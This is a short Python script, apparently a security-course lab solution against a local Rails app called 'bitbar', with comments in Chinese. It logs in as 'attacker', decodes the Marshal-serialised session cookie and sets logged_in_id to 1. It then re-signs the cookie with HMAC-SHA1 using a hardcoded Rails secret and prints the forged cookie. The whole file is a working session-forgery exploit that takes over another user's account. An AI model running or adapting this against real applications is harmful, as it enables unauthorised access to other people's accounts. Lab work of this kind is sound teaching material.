#!/usr/bin/env python
# -*- coding: utf-8 -*-
from rubymarshal.reader import loads
from rubymarshal.writer import writes
import requests
import base64
import hmac
import hashlib

RAILS_SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'

url = 'http://127.0.0.1:3000/post_login'
datas = {'username': 'attacker', 'password': 'attacker'}

r = requests.post(url, data=datas)
# 提取原cookie
cookie = r.cookies.get_dict()['_bitbar_session']
session = cookie.split('--')[0]
session = loads(base64.b64decode(session))

# 构造新session
session['logged_in_id'] = 1
session = base64.b64encode(writes(session))

# 签名
sign = hmac.new(RAILS_SECRET.encode(), session, hashlib.sha1).hexdigest()

# 将新session和新签名组合成新cookie
cookie = session.decode() + '--' + sign
print(cookie)
